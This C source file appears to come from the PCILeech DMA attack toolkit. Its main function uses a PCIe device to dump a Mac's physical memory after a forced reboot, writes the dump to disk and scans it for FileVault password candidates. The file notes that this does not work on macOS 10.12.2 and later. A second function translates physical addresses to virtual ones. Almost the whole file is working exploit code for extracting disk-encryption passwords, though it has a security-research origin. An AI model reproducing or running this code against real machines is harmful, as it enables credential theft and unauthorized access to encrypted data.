// extra.c : implementation related various extra functionality such as exploits.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "extra.h"
#include "device.h"
#include "util.h"

VOID Extra_MacFVRecover_ReadMemory_Optimized(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PBYTE pb512M)
{
	DWORD i, dwOffsets[] = {
		0x74000000, 0x75000000, 0x76000000, 0x77000000, 0x78000000, 0x79000000, 0x7a000000, 0x7b000000,
		0x7c000000, 0x7d000000, 0x7e000000, 0x7f000000, 0x80000000, 0x81000000, 0x82000000, 0x83000000,
		0x84000000, 0x85000000, 0x86000000, 0x87000000, 0x70000000, 0x71000000, 0x72000000, 0x73000000,
		0x88000000, 0x89000000, 0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x8e000000, 0x8f000000
	};
	for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
		DeviceReadDMA(pDeviceData, dwOffsets[i], pb512M + dwOffsets[i] - 0x70000000, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	}
}

BOOL Extra_MacFVRecover_Analyze(_In_ PBYTE pb512M)
{
	DWORD i, o, dwCandidate;
	PBYTE pb;
	BOOL isFound = 0;
	const BYTE CONST_ZERO_32[32] = { 0 };
	BYTE pbLast[32];
	for(o = 0; o < 0x20000000; o += 0x1000) {
		pb = (PBYTE)(pb512M + o);
		if(*(PDWORD)pb != 0x30646870) { // signature "phd0"
			continue; // not correct signature -> skip this page.
		}
		dwCandidate = 0;
		for(i = 0x18; i < 0x800; i += 8) {
			if((*(PQWORD)(pb + i) & 0xff00ff00ff00ff00)) {
				break; // non ascii chars in qword block -> skip this page.
			}
			if(dwCandidate == 0) {
				if(!*(PQWORD)(pb + i)) {
					continue; // empty block -> page is still a candidate.
				}
				if(0 == pb[i + 6]) {
					break; // less than 4 chars in pwd candidate -> skip this page.
				}
				if(*(PQWORD)(pb + i) == 0x0043005f00520047) {
					break; // known false positive starts with GR_C -> skip this page.
				}
				dwCandidate = i;
				continue;
			}
			if(0 == *(PQWORD)(pb + i)) {
				if(memcmp(pb + i, CONST_ZERO_32, 32)) {
					break; // not 32 bytes of zero after pwd candidate -> skip this page.
				}
				// password candidate found!!!
				isFound = TRUE;
				if(memcmp(pbLast, pb + dwCandidate, 32)) { // duplicate removal
					memcpy(pbLast, pb + dwCandidate, 32);
					printf("MAC_FVRECOVER: PASSWORD CANDIDATE: %S\n", pb + dwCandidate);
				}
				break;
			}
		}
	}
	return isFound;
}

VOID Extra_MacFVRecover_SetOutFileName(_Inout_ PCONFIG pCfg)
{
	SYSTEMTIME st;
	if(pCfg->szFileOut[0] == 0) {
		GetLocalTime(&st);
		_snprintf_s(
			pCfg->szFileOut,
			MAX_PATH,
			_TRUNCATE,
			"pcileech-mac-fvrecover-%i%02i%02i-%02i%02i%02i.raw",
			st.wYear,
			st.wMonth,
			st.wDay,
			st.wHour,
			st.wMinute,
			st.wSecond);
	}
}

VOID Action_MacFilevaultRecover(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	HANDLE hFile;
	DWORD cbLength;
	PBYTE pbBuffer512M;
	// Allocate 512 MB buffer
	if(!(pbBuffer512M = LocalAlloc(LMEM_ZEROINIT, 0x20000000))) {
		printf("MAC_FVRECOVER: FAILED. Unable to allocate memory.\n");
		return;
	}
	// Wait for target computer reboot (device will power cycle).
	printf(
		"MAC_FVRECOVER: WAITING ... please reboot ...\n" \
		"  Please force a reboot of the mac by pressing CTRL+CMD+POWER\n" \
		"  WARNING! This will not work in macOS Sierra 10.12.2 and later.\n");
	Util_WaitForPowerCycle(pCfg, pDeviceData);
	// Try read 512M of memory from in the range: [0x70000000..0x90000000[.
	printf("MAC_FVRECOVER: Continuing ...\n");
	Extra_MacFVRecover_ReadMemory_Optimized(pCfg, pDeviceData, pbBuffer512M);
	// Try write to disk image.
	printf("MAC_FVRECOVER: Writing partial memory contents to file ...\n");
	Extra_MacFVRecover_SetOutFileName(pCfg);
	hFile = CreateFileA(pCfg->szFileOut, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hFile || (hFile == INVALID_HANDLE_VALUE)) {
		printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
		hFile = NULL;
	} else if(!WriteFile(hFile, pbBuffer512M, 0x20000000, &cbLength, NULL)) {
		printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
	} else {
		printf("MAC_FVRECOVER: File: %s.\n", pCfg->szFileOut);
	}
	// Analyze for possible password candidates.
	printf("MAC_FVRECOVER: Analyzing ...\n");
	if(Extra_MacFVRecover_Analyze(pbBuffer512M)) {
		printf("MAC_FVRECOVER: Completed.\n");
	} else {
		printf("MAC_FVRECOVER: Failed.\n");
	}
	// clean up.
	LocalFree(pbBuffer512M);
	if(hFile) { CloseHandle(hFile); }
}

VOID Action_PT_Phys2Virt(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	BOOL result;
	QWORD qwVA, qwPTE, qwPDE, qwPDPTE, qwPML4E;
	printf("PT_PHYS2VIRT: searching ... (this may take some time).\n");
	result = Util_PageTable_FindMappedAddress(pCfg, pDeviceData, pCfg->qwCR3, pCfg->qwDataIn[0], &qwVA, &qwPTE, &qwPDE, &qwPDPTE, &qwPML4E);
	if(result) {
		printf("PT_PHYS2VIRT: finished.\n");
		printf("          0x00000000FFFFFFFF\n");
		printf("   PA:    0x%016llx\n", pCfg->qwDataIn[0]);
		printf("   VA:    0x%016llx\n", qwVA);
		printf("   PTE:   0x%016llx\n", qwPTE);
		printf("   PDE:   0x%016llx\n", qwPDE);
		printf("   PDPTE: 0x%016llx\n", qwPDPTE);
		printf("   PML4E: 0x%016llx\n", qwPML4E);
	} else {
		printf("PT_PHYS2VIRT: Failed.\n");
	}
}
